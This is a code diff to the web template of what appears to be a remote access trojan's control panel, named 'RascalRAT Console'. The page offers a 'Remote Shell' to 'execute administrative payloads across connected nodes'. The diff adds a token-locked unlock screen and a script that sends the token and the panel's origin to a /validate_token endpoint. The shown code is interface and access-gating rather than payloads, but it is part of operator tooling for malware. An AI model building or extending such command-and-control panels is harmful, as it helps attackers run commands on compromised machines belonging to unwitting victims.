@@ -340,7 +340,30 @@
 </head>
 <body>
 
-<div class="container">
+{{if .Unauthorized}}
+<div class="modal-overlay" id="authOverlay" style="display:flex;">
+    <div class="modal" style="max-width:420px; width:100%;">
+        <div class="modal-header">
+            <h2>RascalRAT Console</h2>
+        </div>
+        <div style="padding:1.5rem;">
+            <div class="center-align" style="margin-bottom:1.5rem;">
+                <span class="material-icons-round" style="font-size:48px; color:#58a6ff; display:block; margin-bottom:12px;">verified_user</span>
+                <h3 style="margin:0 0 8px 0; font-size:1.25rem; color:var(--text-main);">Unlock Panel</h3>
+                <p style="color:var(--text-muted); font-size:0.9rem; margin:0;">Enter your RascalRAT token to access the console.</p>
+            </div>
+            <div class="form-group">
+                <label for="tokenInput">Encrypted Token</label>
+                <input type="text" id="tokenInput" placeholder="Paste your token here..." style="width:100%;">
+            </div>
+            <button type="button" id="unlockBtn" style="width:100%; margin-top:0.5rem;">Unlock Panel</button>
+            <p id="authError" style="color:#f85149; font-size:0.85rem; margin-top:12px; min-height:1.2em; text-align:center; display:none;"></p>
+        </div>
+    </div>
+</div>
+{{end}}
+
+<div class="container" id="app-container" style="display:none;">
     <header>
         <h1>Remote Shell</h1>
         <p>Execute administrative payloads across connected nodes</p>
@@ -407,7 +430,54 @@
 </div>
 
 <script>
-    const SERVER = "http://localhost:8080";
+    const SERVER = window.location.origin;
+
+    {{if .Unauthorized}}
+    const overlay = document.getElementById("authOverlay");
+    const appContainer = document.getElementById("app-container");
+    if (overlay && appContainer) {
+        overlay.style.display = "flex";
+        appContainer.style.display = "none";
+    }
+
+    document.getElementById("unlockBtn").addEventListener("click", async () => {
+        const token = document.getElementById("tokenInput").value.trim();
+        const errorEl = document.getElementById("authError");
+        const btn = document.getElementById("unlockBtn");
+        errorEl.style.display = "none";
+        btn.disabled = true;
+        btn.textContent = "Unlocking...";
+
+        try {
+            const res = await fetch("/validate_token", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ token: token, remote_url: window.location.origin }),
+            });
+            const data = await res.json();
+            if (res.ok) {
+                window.location.reload();
+            } else {
+                btn.disabled = false;
+                btn.textContent = "Unlock Panel";
+                errorEl.textContent = data.error || "Invalid token";
+                errorEl.style.display = "block";
+            }
+        } catch (err) {
+            btn.disabled = false;
+            btn.textContent = "Unlock Panel";
+            errorEl.textContent = "Validation failed: " + err.message;
+            errorEl.style.display = "block";
+        }
+    });
+    {{else}}
+    if (document.getElementById("authOverlay")) {
+        document.getElementById("authOverlay").style.display = "none";
+    }
+    if (document.getElementById("app-container")) {
+        document.getElementById("app-container").style.display = "block";
+    }
+    {{end}}
 
     let allNodes = [];            // roster from GET /nodes
     let selectedNodes = new Set(); // chosen node ids
